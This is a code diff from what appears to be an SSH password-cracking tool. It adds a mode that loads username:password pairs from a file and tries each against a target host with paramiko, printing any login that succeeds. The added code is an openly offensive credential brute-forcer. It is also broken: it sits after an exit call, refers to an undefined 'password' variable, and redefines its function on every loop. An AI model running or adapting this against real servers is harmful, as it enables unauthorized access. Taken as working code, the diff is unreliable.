@@ -210,3 +210,45 @@ if args.service == "ssh":
               "\n Please provide wordlist with more words to increase your chance"
               "\n------------------------------------------------------------------")
         exit(0)
+
+        # When colon_file is provided
+        if args.colon_file in sys.argv:
+            print("\033[1;34m------------------------------"
+                  "\n     adocracker is started      "
+                  "\n  Take a cup of coffee and wait"
+                  "\n------------------------------")
+            file = open(colon_file)
+            for line in file.readlines():
+                if ":" in line:
+                    user = line.split(':')[0]
+                    pwd = line.split(':')[1]
+
+                    def open_ssh(target, port, user, pwd):
+                        ssh = paramiko.SSHClient()
+                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        try:
+                            ssh.connect(target, port, user, pwd.strip(), timeout=600)
+                        except socket.timeout:
+                            print(f"[!] Host: {target} is unreachable")
+                            return False
+                        except paramiko.AuthenticationException:
+                            if args.verbose in sys.argv:
+                                if args.verbose != "show":
+                                    return False
+                                print('\033[1;37m''[+]', user, '_', pwd)
+                            return False
+                        except paramiko.ssh_exception.NoValidConnectionsError:
+                            print(
+                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
+                            time.sleep(10)
+                            return open_ssh(target, port, user, password)
+                        except paramiko.ssh_exception.SSHException:
+                            print(
+                                "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                            exit(0)
+                        else:
+                            print("\n\033[1;92m-----------------------------------------"
+                                  "\n Password found:", password,
+                                  "\n------------------------------------------")
+                            exit(0)
+                    open_ssh(target, port, user, pwd)
